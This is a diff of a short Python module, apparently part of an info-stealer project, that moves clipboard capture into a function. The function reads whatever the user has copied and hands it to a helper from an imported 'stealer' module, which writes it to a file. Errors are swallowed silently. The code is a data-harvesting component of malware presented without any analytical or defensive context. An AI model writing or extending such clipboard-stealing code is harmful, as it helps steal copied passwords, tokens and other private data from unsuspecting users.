@@ -1,14 +1,12 @@
 import pyperclip
-
-clipboard_content = pyperclip.paste()
+import stealer
 
 def get_bufer():
     try:
+        clipboard_content = pyperclip.paste()
         if clipboard_content:
-            with open("bufer.txt", "w") as b:
-                b.write(clipboard_content)
+            stealer.write_in_bufer("bufer.txt", clipboard_content)
         else:
-            with open("bufer.txt", "w") as b:
-                b.write("bufer is empty")
+            stealer.write_in_bufer("bufer.txt", "buffer is empty")
     except:
         pass
